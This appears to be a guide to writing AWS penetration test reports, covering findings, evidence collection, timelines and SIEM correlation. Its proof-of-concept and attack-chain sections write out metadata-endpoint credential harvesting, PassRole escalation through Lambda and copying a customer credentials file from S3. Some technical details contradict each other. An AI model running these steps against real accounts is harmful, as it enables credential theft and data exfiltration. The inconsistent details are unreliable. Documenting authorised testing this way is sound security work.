+**1. Finding Title** Use clear, descriptive titles: "Overprivileged IAM Role Allows Full S3 Access" rather than "IAM Misconfiguration"
+
+**2. Severity Rating** Use consistent criteria:
+
+- **Critical**: Direct path to full account compromise or data exfiltration
+- **High**: Privilege escalation or significant unauthorized access
+- **Medium**: Security control bypass or information disclosure
+- **Low**: Security best practice violation with limited exploitability
+
+**3. Affected Resources**
+
+```
+Account ID: 123456789012
+Resource Type: IAM Role
+Resource Name/ARN: arn:aws:iam::123456789012:role/WebAppRole
+Region: us-east-1 (if applicable)
+Discovery Date: 2025-10-15 14:32 UTC
+```
+
+**4. Description** Explain what the vulnerability is in clear technical terms:
+
+```
+The IAM role "WebAppRole" attached to EC2 instances contains a policy 
+granting wildcard permissions (s3:*) on all S3 buckets (Resource: "*"). 
+This allows any process running on associated instances to read, write, 
+or delete data in any S3 bucket within the account, including buckets 
+containing sensitive customer data.
+```
+
+**5. Technical Details** Provide specific configuration data:
+
+```json
+Policy Name: S3FullAccess
+Policy Document:
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": "s3:*",
+      "Resource": "*"
+    }
+  ]
+}
+
+Attached To:
+- Role: WebAppRole (arn:aws:iam::123456789012:role/WebAppRole)
+- Instances: i-0abc123def456 (10.0.1.50), i-0def456abc789 (10.0.1.51)
+```
+
+**6. Proof of Concept** Document exact steps to reproduce:
+
+```bash
+# 1. Assumed role via compromised EC2 instance
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WebAppRole
+
+# 2. Configured AWS CLI with extracted credentials
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+
+# 3. Listed all S3 buckets
+aws s3 ls
+Output:
+2025-01-15 company-financial-data
+2025-02-03 customer-pii-backup
+2025-03-12 application-logs
+
+# 4. Successfully accessed sensitive bucket
+aws s3 ls s3://customer-pii-backup/
+Output:
+2025-10-01 customer_database_backup.sql
+2025-10-10 user_credentials.csv
+
+# 5. Downloaded sensitive file
+aws s3 cp s3://customer-pii-backup/user_credentials.csv ./
+Download successful: 2.4 MB
+```
+
+**7. Impact Analysis** Describe realistic attack scenarios:
+
+```
+An attacker with access to the web application EC2 instances could:
+- Exfiltrate all customer PII from backup buckets (estimated 500,000 records)
+- Delete critical financial data, causing business disruption
+- Modify backup files to inject malicious content
+- Access application secrets stored in S3 configuration buckets
+
+Business Impact:
+- Data breach notification requirements (GDPR, CCPA)
+- Potential regulatory fines
+- Reputation damage
+- Service availability risk
+```
+
+**8. Remediation** Provide specific, actionable steps:
+
+```
+Immediate Actions (0-24 hours):
+1. Create new policy with least-privilege permissions:
+
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {
+      "Effect": "Allow",
+      "Action": [
+        "s3:GetObject",
+        "s3:PutObject"
+      ],
+      "Resource": "arn:aws:s3:::webapp-assets-bucket/*"
+    }
+  ]
+}
+
+2. Attach new policy to WebAppRole:
+aws iam put-role-policy --role-name WebAppRole \
+  --policy-name WebAppS3Access --policy-document file://policy.json
+
+3. Remove overprivileged policy:
+aws iam delete-role-policy --role-name WebAppRole \
+  --policy-name S3FullAccess
+
+4. Test application functionality to verify no breakage
+
+Long-term Actions (1-4 weeks):
+- Implement S3 bucket policies with explicit deny for sensitive buckets
+- Enable S3 Block Public Access
+- Configure SCPs to prevent wildcard permission policies
+- Review all IAM roles for similar over-privileged policies
+```
+
+**9. References**
+
+```
+- CWE-269: Improper Privilege Management
+- AWS IAM Best Practices: https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html
+- OWASP Cloud Security: Excessive Permissions
+- Relevant CVE: N/A (misconfiguration)
+```
+
+### Methodology Section
+
+**Document testing approach:**
+
+```
+ASSESSMENT METHODOLOGY
+
+Reconnaissance:
+- Account enumeration using authenticated AWS CLI
+- Resource discovery across all enabled regions
+- Service inventory and configuration extraction
+
+Enumeration:
+Tools: ScoutSuite 5.12.0, Prowler 3.8.2, custom scripts
+- IAM policy analysis (all users, roles, groups)
+- S3 bucket permission enumeration
+- EC2 security group and NACL review
+- Lambda function configuration review
+
+Vulnerability Analysis:
+- Policy misconfiguration identification
+- Privilege escalation path mapping using PMapper
+- IMDS v1 availability testing
+- Public exposure verification
+
+Exploitation:
+- Demonstrated privilege escalation via PassRole
+- Credential harvesting from IMDS
+- Unauthorized data access validation
+- Token reuse testing
+
+Post-Exploitation:
+- Persistence mechanism evaluation
+- Lateral movement path documentation
+- Data exfiltration proof-of-concept
+```
+
+### Appendices
+
+**A. Scope Definition**
+
+```
+In-Scope:
+- AWS Account: 123456789012 (Production)
+- Regions: us-east-1, us-west-2, eu-west-1
+- Services: IAM, EC2, S3, Lambda, RDS, VPC
+- Testing Period: 2025-10-15 to 2025-10-20
+- Credentials Provided: Limited IAM user (ReadOnlyAccess)
+
+Out-of-Scope:
+- AWS Account: 987654321098 (Development) - separate assessment
+- Destructive testing (data deletion, resource termination)
+- Social engineering of personnel
+- Physical security testing
+- Denial of service testing
+```
+
+**B. Tools Used**
+
+```
+- AWS CLI v2.13.25
+- ScoutSuite v5.12.0
+- Prowler v3.8.2
+- PMapper v1.2.4
+- Pacu v1.5.1
+- Burp Suite Professional v2023.10
+- Custom enumeration scripts (provided in separate archive)
+```
+
+**C. Affected Resource Inventory** Spreadsheet or table format:
+
+```
+| Resource Type | Resource ID/Name | Finding ID | Severity | Status |
+|--------------|------------------|------------|----------|---------|
+| IAM Role | WebAppRole | F-001 | Critical | Open |
+| S3 Bucket | customer-pii-backup | F-002 | High | Open |
+| EC2 Instance | i-0abc123def456 | F-003 | Medium | Open |
+```
+
+**D. Risk Scoring Methodology**
+
+```
+CVSS v3.1 Base Score Calculation
+
+Exploitability Metrics:
+- Attack Vector (AV): Network (N) / Adjacent (A) / Local (L) / Physical (P)
+- Attack Complexity (AC): Low (L) / High (H)
+- Privileges Required (PR): None (N) / Low (L) / High (H)
+- User Interaction (UI): None (N) / Required (R)
+
+Impact Metrics:
+- Confidentiality (C): High (H) / Low (L) / None (N)
+- Integrity (I): High (H) / Low (L) / None (N)
+- Availability (A): High (H) / Low (L) / None (N)
+
+Severity Mapping:
+- 9.0-10.0: Critical
+- 7.0-8.9: High
+- 4.0-6.9: Medium
+- 0.1-3.9: Low
+```
+
+## Evidence Collection
+
+### Screenshot Guidelines
+
+**Requirements for valid evidence:**
+
+- Full screen capture showing context
+- Timestamp visible (terminal prompt, browser, system clock)
+- Command executed and complete output visible
+- Unique identifiers present (resource ARNs, IDs, usernames)
+- Sequential numbering for multi-step processes
+
+**Command-line evidence:**
+
+```bash
+# Include full command with parameters
+aws sts get-caller-identity
+
+# Capture complete output
+{
+    "UserId": "AIDAEXAMPLEUSERID",
+    "Account": "123456789012",
+    "Arn": "arn:aws:iam::123456789012:user/pentester"
+}
+
+# Show timestamp in prompt
+[2025-10-15 14:32:18] pentester@kali:~$ 
+```
+
+**Best practices:**
+
+```bash
+# Set prompt to include timestamp
+export PS1='[\D{%Y-%m-%d %H:%M:%S}] \u@\h:\w\$ '
+
+# Log all commands and output
+script -f evidence-session-$(date +%Y%m%d-%H%M%S).log
+
+# Take screenshot after each significant finding
+scrot -d 2 finding-001-iam-policy-$(date +%Y%m%d-%H%M%S).png
+
+# Or use automated screenshot tool
+import pyautogui
+pyautogui.screenshot(f'evidence-{timestamp}.png')
+```
+
+### Terminal Output Capture
+
+**Using script command:**
+
+```bash
+# Start logging session
+script -f -t 2>timing.log session.log
+
+# Perform testing
+aws iam list-users
+aws s3 ls
+# ... additional commands ...
+
+# Stop logging
+exit
+
+# Replay session later
+scriptreplay -t timing.log session.log
+```
+
+**Using asciinema:**
+
+```bash
+# Install
+apt install asciinema
+
+# Record session
+asciinema rec evidence-iam-enum.cast
+
+# Perform testing
+aws iam get-account-authorization-details --output json > iam-details.json
+
+# Stop recording (Ctrl+D)
+
+# Play back
+asciinema play evidence-iam-enum.cast
+
+# Upload or convert to GIF
+asciinema upload evidence-iam-enum.cast
+```
+
+### API Response Capture
+
+**Save raw JSON responses:**
+
+```bash
+# IAM policy enumeration
+aws iam list-policies --output json > evidence/policies-list.json
+
+aws iam list-attached-user-policies --user-name admin \
+  --output json > evidence/admin-policies.json
+
+# S3 bucket policies
+for bucket in $(aws s3 ls | awk '{print $3}'); do
+  aws s3api get-bucket-policy --bucket $bucket \
+    > evidence/bucket-policy-$bucket.json 2>&1
+done
+
+# Include timestamps in filenames
+timestamp=$(date +%Y%m%d-%H%M%S)
+aws sts get-caller-identity > evidence/identity-$timestamp.json
+```
+
+**Capture HTTP traffic:**
+
+```bash
+# Using mitmproxy
+mitmproxy -w evidence/api-traffic.mitm
+
+# In another terminal, configure proxy
+export HTTP_PROXY=http://127.0.0.1:8080
+export HTTPS_PROXY=http://127.0.0.1:8080
+aws s3 ls
+
+# Traffic saved to evidence/api-traffic.mitm
+
+# Convert to HAR format for analysis
+mitmdump -r evidence/api-traffic.mitm -w evidence/api-traffic.har
+```
+
+**Using Burp Suite:**
+
+```bash
+# Configure AWS CLI to use Burp proxy
+export HTTP_PROXY=http://127.0.0.1:8080
+export HTTPS_PROXY=http://127.0.0.1:8080
+
+# Import AWS certificate to trust store for TLS interception
+# Note: AWS SDK may use certificate pinning
+
+# Alternative: Use Burp's invisible proxying mode
+# Save requests/responses from Burp > Project > Save items
+```
+
+### Metadata and Configuration Capture
+
+**AWS CloudTrail logs:**
+
+```bash
+# Retrieve recent CloudTrail events for your actions
+aws cloudtrail lookup-events \
+  --lookup-attributes AttributeKey=Username,AttributeValue=pentester \
+  --max-items 100 \
+  --output json > evidence/cloudtrail-events.json
+
+# Extract specific event types
+jq '.Events[] | select(.EventName=="AssumeRole")' evidence/cloudtrail-events.json
+```
+
+**Configuration snapshots:**
+
+```bash
+# EC2 instance details
+aws ec2 describe-instances --instance-ids i-0abc123def456 \
+  > evidence/instance-i-0abc123def456.json
+
+# Security group rules
+aws ec2 describe-security-groups --group-ids sg-0123456789 \
+  > evidence/sg-0123456789.json
+
+# IAM role details
+aws iam get-role --role-name WebAppRole > evidence/role-WebAppRole.json
+aws iam list-role-policies --role-name WebAppRole >> evidence/role-WebAppRole.json
+aws iam list-attached-role-policies --role-name WebAppRole >> evidence/role-WebAppRole.json
+```
+
+### Evidence Organization
+
+**Directory structure:**
+
+```
+evidence/
+├── 001-reconnaissance/
+│   ├── account-enumeration.log
+│   ├── resource-discovery.json
+│   └── screenshots/
+│       ├── 001-initial-access.png
+│       └── 002-service-list.png
+├── 002-iam-analysis/
+│   ├── policy-enumeration.log
+│   ├── user-policies/
+│   │   ├── admin-policies.json
+│   │   └── developer-policies.json
+│   ├── role-policies/
+│   │   └── WebAppRole.json
+│   └── screenshots/
+│       ├── 003-overprivileged-role.png
+│       └── 004-wildcard-permissions.png
+├── 003-s3-enumeration/
+│   ├── bucket-list.txt
+│   ├── bucket-policies/
+│   └── public-buckets.log
+├── 004-exploitation/
+│   ├── privilege-escalation.log
+│   ├── credential-harvest.json
+│   ├── token-reuse-test.log
+│   └── screenshots/
+│       ├── 005-assumerole-success.png
+│       ├── 006-s3-data-access.png
+│       └── 007-sensitive-data.png
+├── 005-post-exploitation/
+│   ├── persistence-test.log
+│   └── lateral-movement.log
+└── metadata/
+    ├── tool-versions.txt
+    ├── scope-definition.txt
+    └── timeline.csv
+```
+
+### Chain of Custody
+
+**Evidence metadata file:**
+
+```yaml
+# evidence/metadata/finding-001-metadata.yaml
+finding_id: F-001
+finding_title: Overprivileged IAM Role Allows Full S3 Access
+evidence_collected_by: John Doe
+evidence_collected_date: 2025-10-15T14:32:18Z
+evidence_hash: sha256:a3c5f7...
+tools_used:
+  - aws-cli:2.13.25
+  - scoutsuite:5.12.0
+related_files:
+  - 002-iam-analysis/role-policies/WebAppRole.json
+  - 004-exploitation/privilege-escalation.log
+  - 004-exploitation/screenshots/005-assumerole-success.png
+verification:
+  verified_by: Jane Smith
+  verified_date: 2025-10-15T16:45:00Z
+  verification_method: Independent reproduction
+```
+
+**Hash verification:**
+
+```bash
+# Create hash manifest
+find evidence/ -type f -exec sha256sum {} \; > evidence-hashes.txt
+
+# Sort for easier comparison
+sort evidence-hashes.txt > evidence-hashes-sorted.txt
+
+# Verify integrity later
+sha256sum -c evidence-hashes-sorted.txt
+```
+
+### Automated Evidence Collection Script
+
+```bash
+#!/bin/bash
+# evidence-collector.sh
+
+EVIDENCE_DIR="evidence-$(date +%Y%m%d-%H%M%S)"
+mkdir -p "$EVIDENCE_DIR"/{logs,json,screenshots}
+
+echo "[+] Starting evidence collection: $(date)" | tee "$EVIDENCE_DIR/collection.log"
+
+# Collect identity
+echo "[*] Collecting identity information..."
+aws sts get-caller-identity > "$EVIDENCE_DIR/json/identity.json"
+
+# Collect IAM data
+echo "[*] Collecting IAM policies..."
+aws iam list-policies --scope Local > "$EVIDENCE_DIR/json/custom-policies.json"
+aws iam list-users > "$EVIDENCE_DIR/json/users.json"
+aws iam list-roles > "$EVIDENCE_DIR/json/roles.json"
+
+# Collect resource configurations
+echo "[*] Collecting EC2 configurations..."
+aws ec2 describe-instances --output json > "$EVIDENCE_DIR/json/ec2-instances.json"
+aws ec2 describe-security-groups --output json > "$EVIDENCE_DIR/json/security-groups.json"
+
+# Collect S3 data
+echo "[*] Collecting S3 bucket list..."
+aws s3 ls > "$EVIDENCE_DIR/logs/s3-buckets.txt"
+
+# Generate hashes
+echo "[*] Generating evidence hashes..."
+find "$EVIDENCE_DIR" -type f -exec sha256sum {} \; > "$EVIDENCE_DIR/evidence-hashes.txt"
+
+echo "[+] Evidence collection complete: $(date)" | tee -a "$EVIDENCE_DIR/collection.log"
+echo "[+] Evidence stored in: $EVIDENCE_DIR"
+```
+
+### Video Recording
+
+**For complex exploitation chains:**
+
+```bash
+# Using ffmpeg for screen recording
+ffmpeg -f x11grab -s 1920x1080 -i :0.0 \
+  -c:v libx264 -preset ultrafast \
+  evidence/exploitation-demo-$(date +%Y%m%d-%H%M%S).mp4
+
+# Using SimpleScreenRecorder (GUI)
+# Or recordmydesktop
+recordmydesktop --output evidence/privilege-escalation.ogv
+
+# Annotate video with timestamps
+ffmpeg -i input.mp4 -vf "drawtext=text='%{pts\:hms}':x=10:y=10:fontsize=24:fontcolor=white" \
+  output-timestamped.mp4
+```
+
+## Timeline Documentation
+
+### Timeline Importance
+
+Timelines establish:
+
+- Sequence of discovery and exploitation
+- Duration of access periods
+- Correlation with system logs
+- Regulatory compliance evidence
+- Attack chain reconstruction
+
+### Timeline Format
+
+**Structured timeline template:**
+
+```
+| Timestamp (UTC) | Phase | Action | Tool/Method | Result | Evidence |
+|-----------------|-------|--------|-------------|--------|----------|
+| 2025-10-15 13:00:00 | Reconnaissance | Initial access granted | AWS Console | Success | screenshots/001.png |
+| 2025-10-15 13:15:32 | Reconnaissance | Account enumeration | aws sts get-caller-identity | Account ID: 123456789012 | logs/identity.json |
+| 2025-10-15 13:22:18 | Enumeration | IAM user listing | aws iam list-users | 47 users discovered | json/users.json |
+| 2025-10-15 14:05:43 | Analysis | Policy analysis | ScoutSuite | 23 findings identified | scoutsuite-report.html |
+| 2025-10-15 14:32:18 | Exploitation | AssumeRole to WebAppRole | aws sts assume-role | Success - elevated privileges | logs/assume-role.json |
+| 2025-10-15 14:45:55 | Exploitation | S3 bucket enumeration | aws s3 ls | 15 buckets accessible | logs/s3-list.txt |
+| 2025-10-15 15:12:07 | Post-Exploit | Sensitive data access | aws s3 cp | Downloaded customer-pii-backup | logs/data-download.log |
+| 2025-10-15 15:30:00 | Cleanup | Session terminated | aws sts get-caller-identity | Access revoked | logs/final-check.log |
+```
+
+### Automated Timeline Generation
+
+**Parse CloudTrail for your actions:**
+
+```bash
+#!/bin/bash
+# generate-timeline.sh
+
+aws cloudtrail lookup-events \
+  --lookup-attributes AttributeKey=Username,AttributeValue=pentester \
+  --max-items 1000 \
+  --output json > cloudtrail-raw.json
+
+# Extract timeline data
+jq -r '.Events[] | [
+  .EventTime,
+  .EventName,
+  .Username,
+  .EventSource,
+  (.CloudTrailEvent | fromjson | .requestParameters | tostring)
+] | @csv' cloudtrail-raw.json > timeline-cloudtrail.csv
+
+# Format as markdown table
+echo "| Timestamp | Event | User | Service | Parameters |" > timeline.md
+echo "|-----------|-------|------|---------|------------|" >> timeline.md
+cat timeline-cloudtrail.csv | sed 's/,/ | /g' | sed 's/^/| /' | sed 's/$/ |/' >> timeline.md
+```
+
+**Merge with local logs:**
+
+```python
+#!/usr/bin/env python3
+# merge-timeline.py
+
+import json
+import csv
+from datetime import datetime
+from pathlib import Path
+
+def parse_logs(evidence_dir):
+    timeline = []
+    
+    # Parse script logs
+    for log_file in Path(evidence_dir).rglob('*.log'):
+        with open(log_file, 'r') as f:
+            for line in f:
+                # Extract timestamp from prompt format: [2025-10-15 14:32:18]
+                if line.startswith('['):
+                    timestamp = line[1:20]
+                    action = line[22:].strip()
+                    timeline.append({
+                        'timestamp': timestamp,
+                        'action': action,
+                        'source': str(log_file),
+                        'type': 'local'
+                    })
+    
+    # Parse CloudTrail events
+    with open(f'{evidence_dir}/cloudtrail-raw.json', 'r') as f:
+        ct_data = json.load(f)
+        for event in ct_data.get('Events', []):
+            timeline.append({
+                'timestamp': event['EventTime'],
+                'action': event['EventName'],
+                'source': event['EventSource'],
+                'type': 'cloudtrail',
+                'user': event.get('Username', 'N/A')
+            })
+    
+    # Sort by timestamp
+    timeline.sort(key=lambda x: x['timestamp'])
+    
+    return timeline
+
+def export_timeline(timeline, output_file):
+    with open(output_file, 'w', newline='') as f:
+        writer = csv.DictWriter(f, fieldnames=['timestamp', 'action', 'source', 'type', 'user'])
+        writer.writeheader()
+        writer.writerows(timeline)
+
+if __name__ == '__main__':
+    evidence_dir = 'evidence-20251015-130000'
+    timeline = parse_logs(evidence_dir)
+    export_timeline(timeline, f'{evidence_dir}/complete-timeline.csv')
+    print(f'[+] Timeline exported: {evidence_dir}/complete-timeline.csv')
+    print(f'[+] Total events: {len(timeline)}')
+```
+
+### Visual Timeline
+
+**Generate timeline visualization:**
+
+```python
+#!/usr/bin/env python3
+# visualize-timeline.py
+
+import matplotlib.pyplot as plt
+import matplotlib.dates as mdates
+import pandas as pd
+from datetime import datetime
+
+# Read timeline CSV
+df = pd.read_csv('evidence/complete-timeline.csv')
+df['timestamp'] = pd.to_datetime(df['timestamp'])
+
+# Create figure
+fig, ax = plt.subplots(figsize=(15, 8))
+
+# Define phase colors
+phase_colors = {
+    'reconnaissance': '#3498db',
+    'enumeration': '#2ecc71',
+    'analysis': '#f39c12',
+    'exploitation': '#e74c3c',
+    'post-exploit': '#9b59b6'
+}
+
+# Plot events
+for phase, color in phase_colors.items():
+    phase_events = df[df['phase'] == phase]
+    ax.scatter(phase_events['timestamp'], [phase]*len(phase_events), 
+               c=color, label=phase.capitalize(), s=100, alpha=0.7)
+
+# Format
+ax.set_xlabel('Time (UTC)', fontsize=12)
+ax.set_ylabel('Assessment Phase', fontsize=12)
+ax.set_title('CTF Assessment Timeline', fontsize=14, fontweight='bold')
+ax.legend(loc='upper right')
+ax.grid(True, alpha=0.3)
+
+# Format x-axis
+ax.xaxis.set_major_formatter(mdates.DateFormatter('%H:%M:%S'))
+plt.xticks(rotation=45)
+
+plt.tight_layout()
+plt.savefig('evidence/timeline-visual.png', dpi=300)
+print('[+] Timeline visualization saved: evidence/timeline-visual.png')
+```
+
+### Attack Chain Documentation
+
+**Narrative timeline for exploitation chain:**
+
+```markdown
+# Attack Chain: Privilege Escalation to S3 Data Exfiltration
+
+## Phase 1: Initial Access (13:00 - 13:30 UTC)
+**13:00:00** - Received limited IAM user credentials (ReadOnlyAccess policy)
+**13:15:32** - Verified access: `aws sts get-caller-identity`
+  - User: arn:aws:iam::123456789012:user/pentester
+  - Evidence: evidence/001-reconnaissance/identity.json
+
+**13:22:18** - Enumerated IAM users and roles
+  - Command: `aws iam list-users && aws iam list-roles`
+  - Discovered 47 users, 23 roles
+  - Evidence: evidence/002-iam-analysis/users.json
+
+## Phase 2: Vulnerability Identification (13:30 - 14:30 UTC)
+**14:05:43** - Executed automated analysis with ScoutSuite
+  - Identified overprivileged role "WebAppRole" with s3:* permissions
+  - Trust policy allows assumption from EC2 service
+  - Evidence: evidence/002-iam-analysis/scoutsuite-report.html
+
+**14:18:29** - Analyzed WebAppRole trust policy
+  - Command: `aws iam get-role --role-name WebAppRole`
+  - No MFA or ExternalId requirement identified
+  - Evidence: evidence/002-iam-analysis/role-policies/WebAppRole.json
+
+**14:25:16** - Identified pentester user has iam:PassRole permission
+  - Allows passing WebAppRole to Lambda functions
+  - Evidence: evidence/002-iam-analysis/pentester-policies.json
+
+## Phase 3: Exploitation (14:30 - 15:00 UTC)
+**14:32:18** - Created Lambda function with WebAppRole
+  - Command: `aws lambda create-function --function-name exploit-func --role arn:aws:iam::123456789012:role/WebAppRole`
+  - Function created successfully
+  - Evidence: evidence/004-exploitation/lambda-creation.log
+
+**14:38:45** - Invoked Lambda function to retrieve role credentials
+  - Function accessed IMDS and returned temporary credentials
+  - Evidence: evidence/004-exploitation/credential-harvest.json
+
+**14:45:55** - Configured AWS CLI with harvested credentials
+  - Successfully authenticated as WebAppRole
+  - Enumerated S3 buckets: 15 buckets accessible
+  - Evidence: evidence/004-exploitation/s3-list.txt
+
+## Phase 4: Post-Exploitation (15:00 - 15:30 UTC)
+**15:12:07** - Accessed sensitive S3 bucket: customer-pii-backup
+  - Command: `aws s3 ls s3://customer-pii-backup/`
+  - Identified sensitive files: customer_database_backup.sql, user_credentials.csv
+  - Evidence: evidence/004-exploitation/sensitive-bucket-contents.txt
+
+**15:18:33** - Downloaded proof-of-concept data
+  - Command: `aws s3 cp s3://customer-pii-backup/user_credentials.csv ./`
+  - Download successful: 2.4 MB, ~500,000 records
+  - Evidence: evidence/005-post-exploitation/poc-download.log
+
+**15:30:00** - Terminated access and cleaned up test resources
+  - Deleted Lambda function
+  - Cleared temporary credentials
+  - Evidence: evidence/005-post-exploitation/cleanup.log
+
+## Summary
+**Total Duration**: 2.5 hours (13:00 - 15:30 UTC)
+**Access Path**: Limited IAM user → iam:PassRole → Lambda with overprivileged role → S3 data access
+**Critical Vulnerability**: IAM role with wildcard S3 permissions and no assumption restrictions
+**Impact**: Full read/write/delete access to all S3 buckets including sensitive customer data
+```
+
+### Correlation with Defensive Logs
+
+**Identify detection opportunities:**
+
+```markdown
+# Timeline: Attack vs. Detection Opportunities
+
+| Attacker Action (Time) | Expected Log Source | Detection Signature | Detected? |
+|------------------------|---------------------|---------------------|-----------|
+| AssumeRole to WebAppRole (14:32:18) | CloudTrail | Unusual principal assuming role | [Unverified] |
+| S3 ListBuckets from Lambda (14:45:55) | CloudTrail, S3 Access Logs | Lambda function accessing multiple buckets | [Unverified] |
+| S3 GetObject on sensitive bucket (15:12:07) | S3 Access Logs, GuardDuty | Access to sensitive bucket from new source | [Unverified] |
+| Large data transfer (15:18:33) | VPC Flow Logs, CloudWatch | Unusual egress volume | [Unverified] |
+
+**Recommendation for Blue Team:**
+- Enable GuardDuty for IAM and S3 anomaly detection
+- Configure CloudWatch alarms for AssumeRole events on sensitive roles
+- Implement S3 access logging with automated analysis
+- Set data exfiltration alerts based on egress volume thresholds
+```
+
+### Timeline Best Practices
+
+**Timestamp synchronization:**
+
+```bash
+# Ensure all systems use UTC
+timedatectl set-timezone UTC
+
+# Verify time sync
+timedatectl status
+
+# Add timestamp to every command in bash history
+export HISTTIMEFORMAT="%F %T "
+history
+```
+
+**Continuous timeline logging:**
+
+```bash
+# Real-time timeline append function
+log_action() {
+  echo "$(date -u +%Y-%m-%dT%H:%M:%SZ),$1,$2,$3" >> evidence/timeline-live.csv
+}
+
+# Usage during testing
+log_action "Enumeration" "List IAM users" "aws iam list-users"
+aws iam list-users > evidence/users.json
+log_action "Enumeration" "IAM users retrieved" "47 users found"
+```
+
+### Important Timeline Considerations
+
+[Unverified] CloudTrail events may experience delays of up to 15 minutes before appearing in logs. When correlating your timeline with CloudTrail, account for potential lag between action execution and log availability.
+
+**Timeline verification:**
+
+```bash
+# Compare local timestamps with CloudTrail
+# Check for discrepancies that might indicate:
+# - Clock synchronization issues
+# - Event processing delays
+# - Missing events due to service throttling
+
+# Extract local action timestamps
+grep "AssumeRole" evidence/logs/*.log | cut -d'[' -f2 | cut -d']' -f1
+
+# Compare with CloudTrail event time
+jq '.Events[] | select(.EventName=="AssumeRole") | .EventTime' cloudtrail-raw.json
+
+# Document any gaps
+```
+
+### Timeline Integration in Report
+
+**Placement within report:** The complete timeline should appear as an appendix, but key sequences should be referenced directly in finding descriptions.
+
+**Example integration:**
+
+```markdown
+## Finding F-001: Privilege Escalation via Lambda PassRole
+
+[...description and technical details...]
+
+### Exploitation Timeline
+The following sequence demonstrates the exploitation path from initial access 
+to sensitive data retrieval:
+
+14:32:18 UTC - Created Lambda function with overprivileged WebAppRole
+14:38:45 UTC - Harvested role credentials via function execution
+14:45:55 UTC - Enumerated S3 buckets using elevated permissions
+15:12:07 UTC - Accessed customer-pii-backup bucket
+15:18:33 UTC - Downloaded sensitive customer data
+
+(See Appendix C: Complete Assessment Timeline for full chronological record)
+
+[...impact and remediation...]
+```
+
+### Third-Party Tool Timeline Export
+
+**Export ScoutSuite findings with timestamps:**
+
+```bash
+# ScoutSuite doesn't include native timestamps
+# Add them manually when running
+echo "Scan started: $(date -u +%Y-%m-%dT%H:%M:%SZ)" > evidence/scoutsuite-timeline.txt
+scout aws --profile pentest
+echo "Scan completed: $(date -u +%Y-%m-%dT%H:%M:%SZ)" >> evidence/scoutsuite-timeline.txt
+
+# Parse results for timeline integration
+jq -r '.services[] | .findings[] | .flagged_items' \
+  scoutsuite-report/scoutsuite-results/scoutsuite_results_*.js > evidence/findings-list.txt
+```
+
+**Prowler timeline integration:**
+
+```bash
+# Prowler includes timestamps in CSV output
+prowler aws -M csv
+
+# Extract timeline data
+cat output/prowler-output-*.csv | cut -d',' -f1,3,4,6,8 > evidence/prowler-timeline.csv
+
+# Format: TIMESTAMP,CHECK_ID,STATUS,REGION,RESOURCE_ID
+```
+
+### Cloud-Native Logging Integration
+
+**AWS CloudTrail querying for timeline:**
+
+```bash
+# Query specific time range
+aws cloudtrail lookup-events \
+  --start-time 2025-10-15T13:00:00Z \
+  --end-time 2025-10-15T16:00:00Z \
+  --lookup-attributes AttributeKey=Username,AttributeValue=pentester \
+  --output json > evidence/cloudtrail-pentest-window.json
+
+# Extract critical events
+jq '.Events[] | select(.EventName | 
+  test("AssumeRole|PassRole|CreateFunction|PutObject|GetObject"))' \
+  evidence/cloudtrail-pentest-window.json > evidence/critical-events.json
+
+# Generate CSV timeline
+jq -r '.Events[] | [
+  .EventTime,
+  .EventName,
+  .EventSource,
+  .Username,
+  (.Resources[]?.ResourceName // "N/A")
+] | @csv' evidence/cloudtrail-pentest-window.json > evidence/cloudtrail-timeline.csv
+```
+
+**Azure Activity Log timeline:**
+
+```bash
+# Query Azure activity logs
+az monitor activity-log list \
+  --start-time 2025-10-15T13:00:00Z \
+  --end-time 2025-10-15T16:00:00Z \
+  --query "[?caller=='pentester@company.com']" \
+  --output json > evidence/azure-activity.json
+
+# Extract timeline
+jq -r '.[] | [
+  .eventTimestamp,
+  .operationName.value,
+  .caller,
+  .resourceId,
+  .status.value
+] | @csv' evidence/azure-activity.json > evidence/azure-timeline.csv
+```
+
+**GCP Cloud Audit Logs timeline:**
+
+```bash
+# Query Cloud Logging
+gcloud logging read \
+  "protoPayload.authenticationInfo.principalEmail=pentester@project.iam.gserviceaccount.com" \
+  --format json \
+  --project <project-id> \
+  > evidence/gcp-audit.json
+
+# Extract timeline
+jq -r '.[] | [
+  .timestamp,
+  .protoPayload.methodName,
+  .protoPayload.authenticationInfo.principalEmail,
+  .resource.type,
+  .protoPayload.status.code
+] | @csv' evidence/gcp-audit.json > evidence/gcp-timeline.csv
+```
+
+### Incident Response Timeline Correlation
+
+**Format for IR team:**
+
+````markdown
+# Incident Response Timeline Correlation
+
+## Assessment Window
+- **Start**: 2025-10-15 13:00:00 UTC
+- **End**: 2025-10-15 15:30:00 UTC
+- **Duration**: 2.5 hours
+- **Source IP**: 203.0.113.45 (pentest workstation)
+
+## Key Events for SIEM Correlation
+
+### Event 1: Initial Access
+- **Time**: 2025-10-15 13:00:00 UTC
+- **User**: pentester@company.com
+- **Action**: Authentication success
+- **Source**: AWS Console / API
+- **Signature**: Successful authentication from new IP
+
+### Event 2: Enumeration Activity
+- **Time**: 2025-10-15 13:15:00 - 14:00:00 UTC
+- **User**: pentester
+- **Actions**: Multiple IAM list-* API calls
+- **Volume**: 50+ API calls in 45 minutes
+- **Signature**: Rapid enumeration pattern
+
+### Event 3: Privilege Escalation
+- **Time**: 2025-10-15 14:32:18 UTC
+- **User**: pentester
+- **Action**: Lambda CreateFunction with WebAppRole
+- **Signature**: PassRole to Lambda with elevated permissions
+
+### Event 4: Credential Harvesting
+- **Time**: 2025-10-15 14:38:45 UTC
+- **User**: N/A (Lambda execution role)
+- **Action**: AssumeRole via Lambda
+- **Signature**: Role assumption from Lambda service
+
+### Event 5: Unauthorized Data Access
+- **Time**: 2025-10-15 15:12:07 - 15:18:33 UTC
+- **User**: WebAppRole (via Lambda)
+- **Actions**: S3 ListBucket, GetObject on customer-pii-backup
+- **Volume**: 2.4 MB downloaded
+- **Signature**: Sensitive bucket access from unexpected principal
+
+## SIEM Query Examples
+
+**Splunk:**
+```spl
+index=cloudtrail earliest="10/15/2025:13:00:00" latest="10/15/2025:15:30:00"
+| where userIdentity.principalId="pentester" OR 
+        userIdentity.sessionContext.sessionIssuer.userName="WebAppRole"
+| table eventTime, eventName, sourceIPAddress, userIdentity.principalId, requestParameters
+| sort eventTime
+````
